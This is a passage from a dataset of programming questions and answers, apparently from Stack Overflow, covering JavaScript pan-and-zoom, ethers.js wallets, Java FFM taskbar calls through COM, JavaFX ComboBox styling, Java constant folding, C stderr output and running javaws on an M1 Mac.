  top: 250px;
}
<div class=""container"">
  <div class=""map"">
    <div class=""nodes"">
      <div id=""node-1"">node-1</div>
      <div id=""node-2"">node-2</div>
      <div id=""node-3"">node-3</div>
    </div>
    <div class=""connections""></div>
  </div>
</div>



My goal is to get rid of this cursor ""jump"".
","After several attepmts I ended up with this solution:
const usePanAndZoom = (
  canvasRef: RefObject<HTMLElement>,
  graphRef: RefObject<HTMLElement>
): { handleMouseDown: (event: MouseEvent) => void } => {
  let scale = 1;
  const speed = 0.2;
  const offset = { x: 0, y: 0 };
  const target = { x: 0, y: 0 };
  const coordinates = { top: 0, left: 0, x: 0, y: 0 };

  const updateScale = debounce((scale: number) => setScale(scale), 100);

  const draw = (offsetX: number, offsetY: number, scale: number) => {
    requestAnimationFrame(() => {
      if (graphRef.current) {
        graphRef.current.style.transform = `translate(${offsetX}px, ${offsetY}px) scale(${scale})`;
      }
    });
  };

  const handleZoom = (event: WheelEvent) => {
    if (!event.ctrlKey) {
      return;
    }

    event.preventDefault();

    if (graphRef && graphRef.current && canvasRef.current) {
      target.x = (event.clientX - offset.x) / scale;
      target.y = (event.clientY - offset.y) / scale;

      scale += -1 * Math.max(-1, Math.min(1, event.deltaY)) * speed * scale;

      offset.x = -target.x * scale + event.clientX;
      offset.y = -target.y * scale + event.clientY;

      draw(offset.x, offset.y, scale);
      updateScale(scale);
    }
  };

  const handleMouseDown = useCallback(
    (event: MouseEvent) => {
      // it must be left mouse button
      if (event.button !== 0) {
        return;
      }

      if (canvasRef.current) {
        coordinates.x = event.clientX;
        coordinates.y = event.clientY;
        canvasRef.current.onmousemove = mouseMoveHandler;
        canvasRef.current.onmouseup = mouseUpHandler;
      }
    },
    [scale]
  );

  const mouseMoveHandler = (event: MouseEvent) => {
    if (canvasRef.current && graphRef.current) {
      const dx = offset.x + event.clientX - coordinates.x;
      const dy = offset.y + event.clientY - coordinates.y;
      draw(dx, dy, scale);
    }
  };

  const mouseUpHandler = (event: MouseEvent) => {
    if (canvasRef.current) {
      canvasRef.current.onmousemove = null;
      canvasRef.current.onmouseup = null;

      offset.x += event.clientX - coordinates.x;
      offset.y += event.clientY - coordinates.y;
    }
  };

  useEffect(() => {
    if (graphRef.current && canvasRef.current) {
      graphRef.current.style.transformOrigin = `${canvasRef.current.scrollLeft}px ${canvasRef.current.scrollTop}px`;
    }
  }, [canvasRef.current, graphRef.current]);

  useEffect(() => {
    if (!canvasRef || !canvasRef.current) {
      return;
    }

    canvasRef.current.addEventListener('wheel', handleZoom, { passive: false });

    return () => {
      canvasRef.current?.removeEventListener('wheel', handleZoom);
    };
  }, [canvasRef]);

  return {
    handleMouseDown,
  };
};

Not sure about using requestAnimationFrame and if it does make sense to use it here, but anyway.
",javascript
create random wallet with connection to a specific provider via ethersjs,"Problem
I am trying to create random wallets via the function Ethers.Wallet.createRandom with a connection to a specific network (like Ropsten for example). The docs specify that I can pass an optional options object.
What I tried
I tried passing a connection to the network like this:
const networkProvider = await new Ethers.getDefaultProvider(process.env.NETWORK);
const wallet = Ethers.Wallet.createRandom({ provider: networkProvider });

Unfortunately, that did not work.
Question
Is there an option to pass the network when creating the wallet or has this to be done later?
","The returned Wallet object (docs) contains the private key and the address of the wallet. However, the address generating algorithm is universal across all networks. So if a private key 0x123 generates an address 0x456, you can always use the same 0x123 private key to sign transactions from 0x456 address on all networks - the mainnet, Ropsten, Rinkeby, etc.
The network on which you broadcast the transaction depends on what network is your provider connected to. So if your want to limit on what networks the app can send transactions, you need to validate the provider's getNetwork() returned value (docs).
Ad the options param: In the createRandom() source code, it only uses the param to affect the pseudo-randomness of how the private key is generated. But again, it's not related to the network(s) on which you're going to be using the wallet.
",javascript
control taskbar in windows from java using ffm and winapi,"I'm trying to control a taskbar so I can show a progress of some long running task in the JavaFX application. For communicating with winapi I want to use the new Java FFM API, which should replace the JNI one day.
So far I was able successfully create instance of ITaskbarList3 instance, but I'm not able to call any method on it.
I'm using jextract to extract functions from winapi to make sure they are correctly mapped to API:
jextract --output target/generated-sources/jextract -t ""taskbar_test.gen"" -l :shell32 -l :Explorerframe -l :ole32 -I ""C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\shared"" -I ""C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\um"" -I ""C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\km"" -I ""C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\km\crt"" ""C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\um\ShObjIdl_core.h""

In the code below, you can find complete application with my attempt to in the end call function SetProgressValue. My issue is that I'm not able to successfully call function HrInit which should be called to initialize the ITaskbarList.
package taskbar_test;
import com.sun.glass.ui.Window;
import javafx.application.Application;
import javafx.stage.Stage;
import taskbar_test.gen.CLSID;
import taskbar_test.gen.IID;
import taskbar_test.gen.ITaskbarList;
import taskbar_test.gen.ITaskbarList3;
import taskbar_test.gen.ITaskbarList3Vtbl;
import taskbar_test.gen.ITaskbarListVtbl;
import taskbar_test.gen.ShObjIdl_core_h;
import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
public class FxWinTaskbar extends Application {
     public static final String GUID_FORMAT = ""{%s}"";
     // CLSID of ITaskbarList3
     public static final String CLSID_CONST = ""56FDF344-FD6D-11d0-958A-006097C9A090"";
     // IID of ITaskbarList3
     public static final String IID_ITASKBAR_LIST = ""56FDF342-FD6D-11d0-958A-006097C9A090"";
     public static final String IID_ITASKBAR_LIST_3 = ""EA1AFB91-9E28-4B86-90E9-9E9F8A5EEFAF"";
     @Override
     public void start(Stage stage) throws Exception {
         var button = new javafx.scene.control.Button(""Click Me"");
         button.setOnAction(e -> handleClick());
         var root = new javafx.scene.layout.StackPane(button);
         var scene = new javafx.scene.Scene(root, 300, 200);
         stage.setTitle(""JavaFX Stage with Button"");
         stage.setScene(scene);
         stage.show();
     }
    void handleClick() {
        long rawHandle = Window.getWindows().getFirst().getRawHandle();
        Executors.newSingleThreadExecutor().submit(() -> {
            try (var arena = Arena.ofConfined()) {
                // 1. Initialize variables

                // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-clsidfromstring#remarks
                // The CLSID format is {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.
                var clsidString = arena.allocateFrom(GUID_FORMAT.formatted(CLSID_CONST), StandardCharsets.UTF_16LE);
                var iidITaskbarList = arena.allocateFrom(GUID_FORMAT.formatted(IID_ITASKBAR_LIST), StandardCharsets.UTF_16LE);
                var iidITaskbarList3 = arena.allocateFrom(GUID_FORMAT.formatted(IID_ITASKBAR_LIST_3), StandardCharsets.UTF_16LE);
                var clsid = CLSID.allocate(arena);
                var iidTaskbarList = IID.allocate(arena);
                var iidTaskbarList3 = IID.allocate(arena);
                var taskbarPtrToPtr = arena.allocate(ShObjIdl_core_h.C_POINTER);
                var taskbar3PtrToPtr = arena.allocate(ShObjIdl_core_h.C_POINTER);
                MemorySegment windowHandle = arena.allocate(ValueLayout.ADDRESS, rawHandle);

                // 2. Initialize COM
                int hr = ShObjIdl_core_h.CoInitializeEx(MemorySegment.NULL, ShObjIdl_core_h.COINIT_MULTITHREADED());
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""CoInitialize failed with error code: "" + hr);
                }

                // 3. Create CLSID and IIDs
                hr = ShObjIdl_core_h.CLSIDFromString(clsidString, clsid);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""CLSIDFromString failed with error code: "" + hr);
                }

                hr = ShObjIdl_core_h.IIDFromString(iidITaskbarList, iidTaskbarList);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""IIDFromString failed with error code: "" + hr);
                }

                hr = ShObjIdl_core_h.IIDFromString(iidITaskbarList3, iidTaskbarList3);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""IIDFromString failed with error code: "" + hr);
                }

                // 4. Create instance of ITaskbarList
                hr = ShObjIdl_core_h.CoCreateInstance(clsid, MemorySegment.NULL, ShObjIdl_core_h.CLSCTX_ALL(), iidTaskbarList, taskbarPtrToPtr);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    if (hr == ShObjIdl_core_h.REGDB_E_CLASSNOTREG()) {
                        System.out.println(""COM class is not registered!"");
                    }
                    throw new RuntimeException(""CoCreateInstance failed with error code: "" + hr);
                }
                // CoCreateInstance returns pointer to pointer to ITaskbarList so here we obtain the ""inner"" pointer
                var taskbarPtr = taskbarPtrToPtr.get(ValueLayout.ADDRESS, 0);
                // Use reinterpret method to have access to the actual ITaskbarList instance
                var taskbarListInstance = ITaskbarList.reinterpret(taskbarPtr, arena, _ -> {
                    System.out.println(""Some cleanup..."");
                });

                // 5. Obtain lpVtbl pointer from ITaskbarList
                MemorySegment taskbarListVtblPtr = ITaskbarList.lpVtbl(taskbarListInstance);
                // Use reinterpret method to have access to the actual ITaskbarListVtbl instance
                MemorySegment taskbarListVtbl = ITaskbarListVtbl.reinterpret(taskbarListVtblPtr, arena, _ -> {
                    System.out.println(""Some cleanup..."");
                });

                // 6. Get pointer to function HrInit to initialize ITaskbarList
                // https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nf-shobjidl_core-itaskbarlist-hrinit
                // Initializes the taskbar list object. This method must be called before any other ITaskbarList methods can be called.
                MemorySegment functionHrInitPtr = ITaskbarListVtbl.HrInit(taskbarListVtbl);
                hr = ITaskbarListVtbl.HrInit.invoke(functionHrInitPtr, taskbarListVtbl);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""HrInit failed with error code: "" + hr);
                }

                // 7. Create instance of ITaskbarList3
                hr = ShObjIdl_core_h.CoCreateInstance(clsid, MemorySegment.NULL, ShObjIdl_core_h.CLSCTX_ALL(), iidTaskbarList3, taskbar3PtrToPtr);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    if (hr == ShObjIdl_core_h.REGDB_E_CLASSNOTREG()) {
                        System.out.println(""COM class is not registered!"");
                    }
                    throw new RuntimeException(""CoCreateInstance failed with error code: "" + hr);
                }
                // 8. Obtain a pointer to the instance
                var taskbar3Ptr = taskbar3PtrToPtr.get(ValueLayout.ADDRESS, 0);
                // Use reinterpret method to have access to the actual ITaskbarList3 instance
                var taskbarList3Instance = ITaskbarList3.reinterpret(taskbar3Ptr, arena, _ -> {
                    System.out.println(""Some cleanup..."");
                });

                // 9. Obtain lpVtbl pointer from ITaskbarList3
                MemorySegment taskbarList3VtblPtr = ITaskbarList3.lpVtbl(taskbarList3Instance);
                // Use reinterpret method to have access to the actual ITaskbarList3Vtbl instance
                MemorySegment taskbarList3Vtbl = ITaskbarList3Vtbl.reinterpret(taskbarList3VtblPtr, arena, _ -> {
                    System.out.println(""Some cleanup..."");
                });

                // 10. Set progress state to indeterminate
                MemorySegment functionSetProgressStatePtr = ITaskbarList3Vtbl.SetProgressState(taskbarList3Vtbl);
                hr = ITaskbarList3Vtbl.SetProgressState.invoke(functionSetProgressStatePtr, taskbarList3Vtbl, windowHandle, ShObjIdl_core_h.TBPF_INDETERMINATE());
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""SetProgressState failed with error code: "" + hr);
                }

            } catch (Throwable ex) {
                ex.printStackTrace();

            } finally {
                ShObjIdl_core_h.CoUninitialize();
            }
        });
    }

    public static void main(String[] args) {
         launch(args);
     }
 }

I'm not able to call the function SetProgressState directly on interface ITaskbarList3 because generated sources does not have the ability to do so. Instead I have to manually obtain vtbl structure and call the function on this structure.
As you can see on the picture below, the address of vtblPtr and function for HrInit are completely off. Calling function HrInit will fail, because it is accesssing wrong memory.
Does anyone have idea what am I doing wrong?
Thank you.
Petr

Edit: I have applied suggestions from comments. Now, there is only one instance ITaskbarList3 created and all functions are called on it. I have also extended the code to simulate some progress to see if it can set the progress. The code seems to be running, but unfortunately the taskbar is still without any changes.
package taskbar_test;

import com.sun.glass.ui.Window;
import javafx.application.Application;
import javafx.stage.Stage;
import taskbar_test.gen.CLSID;
import taskbar_test.gen.IID;
import taskbar_test.gen.ITaskbarList3;
import taskbar_test.gen.ITaskbarList3Vtbl;
import taskbar_test.gen.ShObjIdl_core_h;

import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

public class FxWinTaskbar extends Application {

    public static final String GUID_FORMAT = ""{%s}"";

    // CLSID of ITaskbarList3
    public static final String CLSID_CONST = ""56FDF344-FD6D-11d0-958A-006097C9A090"";
    // IID of ITaskbarList3
    public static final String IID_ITASKBAR_LIST_3 = ""EA1AFB91-9E28-4B86-90E9-9E9F8A5EEFAF"";

    @Override
    public void start(Stage stage) throws Exception {
        var button = new javafx.scene.control.Button(""Click Me"");
        button.setOnAction(e -> handleClick());

        var root = new javafx.scene.layout.StackPane(button);
        var scene = new javafx.scene.Scene(root, 300, 200);

        stage.setTitle(""JavaFX Stage with Button"");
        stage.setScene(scene);
        stage.show();
    }

    void handleClick() {
        long rawHandle = Window.getWindows().getFirst().getRawHandle();
        Executors.newSingleThreadExecutor().submit(() -> {
            try (var arena = Arena.ofConfined()) {
                // 1. Initialize variables

                // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-clsidfromstring#remarks
                // The CLSID format is {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.
                var clsidString = arena.allocateFrom(GUID_FORMAT.formatted(CLSID_CONST), StandardCharsets.UTF_16LE);
                var iidITaskbarList3 = arena.allocateFrom(GUID_FORMAT.formatted(IID_ITASKBAR_LIST_3), StandardCharsets.UTF_16LE);
                var clsid = CLSID.allocate(arena);
                var iidTaskbarList3 = IID.allocate(arena);
                var taskbar3PtrToPtr = arena.allocate(ShObjIdl_core_h.C_POINTER);
                MemorySegment windowHandle = arena.allocate(ValueLayout.ADDRESS, rawHandle);

                // 2. Initialize COM
                int hr = ShObjIdl_core_h.CoInitializeEx(MemorySegment.NULL, ShObjIdl_core_h.COINIT_MULTITHREADED());
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""CoInitialize failed with error code: "" + hr);
                }

                // 3. Create CLSID and IIDs
                hr = ShObjIdl_core_h.CLSIDFromString(clsidString, clsid);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""CLSIDFromString failed with error code: "" + hr);
                }

                hr = ShObjIdl_core_h.IIDFromString(iidITaskbarList3, iidTaskbarList3);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""IIDFromString failed with error code: "" + hr);
                }

                // 4. Create instance of ITaskbarList3
                hr = ShObjIdl_core_h.CoCreateInstance(clsid, MemorySegment.NULL, ShObjIdl_core_h.CLSCTX_ALL(), iidTaskbarList3, taskbar3PtrToPtr);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    if (hr == ShObjIdl_core_h.REGDB_E_CLASSNOTREG()) {
                        System.out.println(""COM class is not registered!"");
                    }
                    throw new RuntimeException(""CoCreateInstance failed with error code: "" + hr);
                }
                // 5. Obtain a pointer to the instance
                var taskbar3Ptr = taskbar3PtrToPtr.get(ValueLayout.ADDRESS, 0);
                // Use reinterpret method to have access to the actual ITaskbarList3 instance
                var taskbarList3Instance = taskbar3Ptr.reinterpret(ITaskbarList3.sizeof());

                // 6. Obtain lpVtbl pointer from ITaskbarList3
                MemorySegment taskbarList3VtblPtr = ITaskbarList3.lpVtbl(taskbarList3Instance);
                // Use reinterpret method to have access to the actual ITaskbarList3Vtbl instance
                MemorySegment taskbarList3Vtbl = taskbarList3VtblPtr.reinterpret(ITaskbarList3Vtbl.sizeof());

                // https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nf-shobjidl_core-itaskbarlist-hrinit
                // Initializes the taskbar list object. This method must be called before any other ITaskbarList methods can be called.
                MemorySegment functionHrInitPtr = ITaskbarList3Vtbl.HrInit(taskbarList3Vtbl);
                hr = ITaskbarList3Vtbl.HrInit.invoke(functionHrInitPtr, taskbarList3Instance);
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""HrInit failed with error code: "" + hr);
                }

                // 7. Set progress state to indeterminate
                MemorySegment functionSetProgressStatePtr = ITaskbarList3Vtbl.SetProgressState(taskbarList3Vtbl);
                hr = ITaskbarList3Vtbl.SetProgressState.invoke(functionSetProgressStatePtr, taskbarList3Instance, windowHandle, ShObjIdl_core_h.TBPF_INDETERMINATE());
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""SetProgressState failed with error code: "" + hr);
                }

                // 8. Simulate some progress
                for (int i = 0; i < 100; i+=20) {
                    System.out.println(""Progress is: "" + i);
                    MemorySegment functionSetProgressValuePtr = ITaskbarList3Vtbl.SetProgressValue(taskbarList3Vtbl);
                    hr = ITaskbarList3Vtbl.SetProgressValue.invoke(functionSetProgressValuePtr, taskbarList3Instance, windowHandle, i, 100);
                    if (hr != ShObjIdl_core_h.S_OK()) {
                        throw new RuntimeException(""SetProgressValue failed with error code: "" + hr);
                    }
                    Thread.sleep(500);

                }

                // 9. Reset progress state
                hr = ITaskbarList3Vtbl.SetProgressState.invoke(functionSetProgressStatePtr, taskbarList3Instance, windowHandle, ShObjIdl_core_h.TBPF_INDETERMINATE());
                if (hr != ShObjIdl_core_h.S_OK()) {
                    throw new RuntimeException(""SetProgressState failed with error code: "" + hr);
                }

            } catch (Throwable ex) {
                ex.printStackTrace();

            } finally {
                ShObjIdl_core_h.CoUninitialize();
            }
        });
    }

    public static void main(String[] args) {
        launch(args);
    }
}


","The code changes you have edited get you much closer, firstly by calling each callback with vtable+instance.  The jextract generated code gives calls to lookup each Method in the vtable of each OLE interface IXXX. The MemorySegment must be reinterpreted to match the exact memory sizes or the bounds checking of MemorySegment will fail:
// instance is CoCreateInstance return value
MemorySegment instance = pointer.get(ValueLayout.ADDRESS, 0); 

// order of Method invoke() is vTable, instance, ... params
// IXXXVtbl.Method.invoke(IXXXVtbl.Method(IXXX.lpVtbl(instance)), instance, ...)
// Interpret correct memory bounds:
MemorySegment iUnknown = instance.reinterpret(IUnknown.sizeof());
MemorySegment vtabXXX = IUnknown.lpVtbl(iUnknown ).reinterpret(IXXXVtbl.sizeof());
IXXXVtbl.Method.invoke(vtabXXX, instance, ...)

Remy Lebeau's comment eliminates the unnecessary CoCreateInstance.
The last issue is that you have not assigned hWnd correctly, it can be resolved as an address using:
// Wrong: allocates new address containing hWnd
// MemorySegment windowHandle = arena.allocate(ValueLayout.ADDRESS, rawHandle);
// hWnd is address:
MemorySegment windowHandle = MemorySegment.ofAddress(rawHandle);

I could not run your JavaFX example, but packaged the foreign memory calls to a new method and tested with a hWnd of a JFrame - deliberately not tidying your code here:
static void updateTaskBar(long rawHandle) throws InterruptedException {
    try (var arena = Arena.ofConfined()) {
        // 1. Initialize variables

        // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-clsidfromstring#remarks
        // The CLSID format is {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.
        var clsidString = arena.allocateFrom(GUID_FORMAT.formatted(CLSID_CONST), StandardCharsets.UTF_16LE);
        var iidITaskbarList3 = arena.allocateFrom(GUID_FORMAT.formatted(IID_ITASKBAR_LIST_3), StandardCharsets.UTF_16LE);
        var clsid = CLSID.allocate(arena);
        var iidTaskbarList3 = IID.allocate(arena);
        var taskbar3PtrToPtr = arena.allocate(Win_h.C_POINTER);
        // FiXED:
        // MemorySegment windowHandle = arena.allocate(ValueLayout.ADDRESS, rawHandle);
        MemorySegment windowHandle = MemorySegment.ofAddress(rawHandle);

        // 2. Initialize COM
        int hr = Win_h.CoInitializeEx(MemorySegment.NULL, Win_h.COINIT_MULTITHREADED());
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""CoInitialize failed with error code: "" + hr);
        }

        // 3. Create CLSID and IIDs
        hr = Win_h.CLSIDFromString(clsidString, clsid);
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""CLSIDFromString failed with error code: "" + hr);
        }

        hr = Win_h.IIDFromString(iidITaskbarList3, iidTaskbarList3);
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""IIDFromString failed with error code: "" + hr);
        }

        // 4. Create instance of ITaskbarList3
        hr = Win_h.CoCreateInstance(clsid, MemorySegment.NULL, Win_h.CLSCTX_ALL(), iidTaskbarList3, taskbar3PtrToPtr);
        if (hr != Win_h.S_OK()) {
            if (hr == Win_h.REGDB_E_CLASSNOTREG()) {
                System.out.println(""COM class is not registered!"");
            }
            throw new RuntimeException(""CoCreateInstance failed with error code: "" + hr);
        }
        // 5. Obtain a pointer to the instance
        var taskbar3Ptr = taskbar3PtrToPtr.get(ValueLayout.ADDRESS, 0);
        // Use reinterpret method to have access to the actual ITaskbarList3 instance
        var taskbarList3Instance = taskbar3Ptr.reinterpret(ITaskbarList3.sizeof());

        // 6. Obtain lpVtbl pointer from ITaskbarList3
        MemorySegment taskbarList3VtblPtr = ITaskbarList3.lpVtbl(taskbarList3Instance);
        // Use reinterpret method to have access to the actual ITaskbarList3Vtbl instance
        MemorySegment taskbarList3Vtbl = taskbarList3VtblPtr.reinterpret(ITaskbarList3Vtbl.sizeof());

        // https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nf-shobjidl_core-itaskbarlist-hrinit
        // Initializes the taskbar list object. This method must be called before any other ITaskbarList methods can be called.
        MemorySegment functionHrInitPtr = ITaskbarList3Vtbl.HrInit(taskbarList3Vtbl);
        hr = ITaskbarList3Vtbl.HrInit.invoke(functionHrInitPtr, taskbarList3Instance);
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""HrInit failed with error code: "" + hr);
        }

        // 7. Set progress state to indeterminate
        MemorySegment functionSetProgressStatePtr = ITaskbarList3Vtbl.SetProgressState(taskbarList3Vtbl);
        hr = ITaskbarList3Vtbl.SetProgressState.invoke(functionSetProgressStatePtr, taskbarList3Instance, windowHandle, Win_h.TBPF_INDETERMINATE());
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""SetProgressState failed with error code: "" + hr);
        }

        // 8. Simulate some progress
        int max = 100;
        for (int i = 0; i < max; i++) {
            System.out.println(windowHandle+ "" SetProgressValue ""+i);
            MemorySegment functionSetProgressValuePtr = ITaskbarList3Vtbl.SetProgressValue(taskbarList3Vtbl);
            hr = ITaskbarList3Vtbl.SetProgressValue.invoke(functionSetProgressValuePtr, taskbarList3Instance, windowHandle, i, max);
            if (hr != Win_h.S_OK()) {
                throw new RuntimeException(""SetProgressValue failed with error code: "" + hr);
            }
            Thread.sleep(500);
        }
        // 9. Reset progress state
        hr = ITaskbarList3Vtbl.SetProgressState.invoke(functionSetProgressStatePtr, taskbarList3Instance, windowHandle, Win_h.TBPF_INDETERMINATE());
        if (hr != Win_h.S_OK()) {
            throw new RuntimeException(""SetProgressState failed with error code: "" + hr);
        }
    } finally {
        Win_h.CoUninitialize();
    }
}

",java
is there a way to add a style class to the popup of a specific combobox,"I want to have a special style class for a ComboBox that I could reuse. For example, I want to create a class yellowed that will provide yellow background. This is my code:
Java:
public class NewMain extends Application {

    @Override
    public void start(Stage primaryStage) {
        ComboBox<String> comboBox = new ComboBox<>();
        comboBox.getItems().addAll(""Option 1"", ""Option 2"", ""Option 3"");
        comboBox.getStyleClass().add(""yellowed"");

        VBox vbox = new VBox(comboBox);
        Scene scene = new Scene(vbox, 400, 300);
        scene.getStylesheets().add(NewMain.class.getResource(""test.css"").toExternalForm());
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}

CSS:
.combo-box.yellowed {
    -fx-background-color: yellow;
}

.combo-box-popup.yellowed > .list-view > .virtual-flow > .clipped-container > .sheet > .list-cell {
    -fx-background-color: yellow;
}

The problem is that the popup (of my ComboBox with yellowed style class) that will be shown won't have a yellowed class.
Could anyone say, if there is a way to add a style class to the popup of a specific ComboBox?
","The popup is considered a descendant of the ComboBox1. This is documented by the JavaFX CSS Reference Guide:

ComboBox
Style class: combo-box
The ComboBox control has all the properties and pseudo‑classes of ComboBoxBase
Substructure

list-cell — a ListCell instance used to show the selection in the button area of a non-editable ComboBox
text-input — a TextField instance used to show the selection and allow input in the button area of an editable ComboBox
combo-box-popup — a PopupControl that is displayed when the button is pressed [emphasis added]

list-view — a ListView

list-cell — a ListCell






So, all you need to do is:
.combo-box.yellowed .combo-box-popup .list-cell {
  -fx-background-color: yellow;
}

Technically, combo-box.yellowed .list-cell is sufficient, but note that will also target the node used to display the actual combo box (i.e., the ""button cell"", which is also a ListCell). And of course you can make the selector more specific if you want/need to.
Here's a runnable example:
import javafx.application.Application;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.ComboBox;
import javafx.scene.layout.HBox;
import javafx.stage.Stage;

public class Main extends Application {

  // Text blocks require Java 15+
  private static final String STYLESHEET =
      """"""
      .combo-box.yellow,
      .combo-box.yellow .combo-box-popup .list-cell {
        -fx-background-color: yellow;
      }

      .combo-box.red,
      .combo-box.red .combo-box-popup .list-cell {
        -fx-background-color: red;
      }
      """""";

  @Override
  public void start(Stage primaryStage) {
    var box1 = createComboBox();
    box1.getStyleClass().add(""yellow"");

    var box2 = createComboBox();
    box2.getStyleClass().add(""red"");

    var root = new HBox(10, box1, box2);
    root.setAlignment(Pos.CENTER);

    var scene = new Scene(root, 500, 300);
    // Adding stylesheet via data URI requires JavaFX 17+
    scene.getStylesheets().add(""data:text/css,"" + STYLESHEET);

    primaryStage.setScene(scene);
    primaryStage.show();
  }

  private ComboBox<String> createComboBox() {
    var box = new ComboBox<String>();
    for (int i = 1; i <= 5; i++) {
      box.getItems().add(""Option #"" + i);
    }
    // The 'getFirst' method requires Java 21+
    box.setValue(box.getItems().getFirst());
    return box;
  }

  public static void main(String[] args) {
    launch(Main.class);
  }
}

Note the example, as written, requires Java 21+ and JavaFX 17+.

1. For the curious, this is implemented by overriding PopupControl#getStyleableParent() to return the control.
",java
cost of compile time performance,"It appears to me that of the 2 approaches, the first one had performace issues related to string concat and toCharArray. But I was told that both these operations occur at compile time so there is no performance overhead.
If this is true then why are compile time operations not performance overheads ?
private final static char[] DigitTens = {
     (""0000000000""+ ""1111111111""+""2222222222""+""3333333333""+""4444444444"" //
     +""5555555555""+""6666666666""+""7777777777""+""8888888888""+""9999999999"")
      .toCharArray();             
};

VS:
private final static char[] DigitTens = {
    '0', '0', '0', '0', '0', '0', '0', '0', '0', '0',
    '1', '1', '1', '1', '1', '1', '1', '1', '1', '1',
    '2', '2', '2', '2', '2', '2', '2', '2', '2', '2',
    '3', '3', '3', '3', '3', '3', '3', '3', '3', '3',
    '4', '4', '4', '4', '4', '4', '4', '4', '4', '4',
    '5', '5', '5', '5', '5', '5', '5', '5', '5', '5',
    '6', '6', '6', '6', '6', '6', '6', '6', '6', '6',
    '7', '7', '7', '7', '7', '7', '7', '7', '7', '7',
    '8', '8', '8', '8', '8', '8', '8', '8', '8', '8',
    '9', '9', '9', '9', '9', '9', '9', '9', '9', '9',
};

","The string concatenation expression with the +s is a constant expression and is resolved at compile time (JLS §15.28). However, the toCharArray() call is executed at runtime. Overall, your first snippet is equivalent to this:
private final static char[] DigitTens;

static {
    DigitTens = ""0000000000111111111122222222223333333333444444444455555555556666666666777777777788888888889999999999""
            .toCharArray();
}

And your second snippet is equivalent to:
private final static char[] DigitTens;

static {
    DigitTens = new char[100];
    DigitTens[0] = '0';
    DigitTens[1] = '0';
    ...
    DigitTens[99] = '9';
}

(You can see this yourself in the bytecode via javap -c)
Ultimately, don't worry about performance here; you likely won't see a difference. Pick whatever you think is clearer and easier to manage. More often than not the time it takes to compile code is irrelevant, since the compilations stage should really only happen once, after which you'll be dealing with the generated .class files that contain the bytecode.
I'll also point out that in this specific case, DigitTens[i] is simply i / 10, assuming i is in the range 0-99, inclusive.
",java
how can i print to standard error in c with 39printf39,"In C, printing to standard output (stdout) is easy, with printf from stdio.h.
However, how can I print to standard error (stderr)? We can use fprintf to achieve it apparently, but its syntax seems strange. Maybe we can use printf to print to standard error?
","The syntax is almost the same as printf. With printf you give the string format and its contents ie:
printf(""my %s has %d chars\n"", ""string format"", 30);

With fprintf it is the same, except now you are also specifying the place to print to:
FILE *myFile;
...
fprintf(myFile, ""my %s has %d chars\n"", ""string format"", 30);

Or in your case:
fprintf(stderr, ""my %s has %d chars\n"", ""string format"", 30);

",c
java 8 is installed on macbook air  apple m1 how to open jnlp files,"Now I have installed Java 8. Please see the paths and do tell me what am I missing. JNLP files can't be launched with javaws comand.
Macbook Air M1
% echo $PATH
/Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
:/Users/xx/installations/icedtea/bin:/opt/homebrew/bin:/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/System/Cryptexes/App/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/local/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/appleinternal/bin

Java version:
% which java  
/Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home/bin/java

% java -version
openjdk version ""1.8.0_292""
OpenJDK Runtime Environment (AdoptOpenJDK)(build 1.8.0_292-b10)
OpenJDK 64-Bit Server VM (AdoptOpenJDK)(build 25.292-b10, mixed mode)

% javaws 
The operation couldn’t be completed. Unable to locate a Java Runtime that supports javaws.
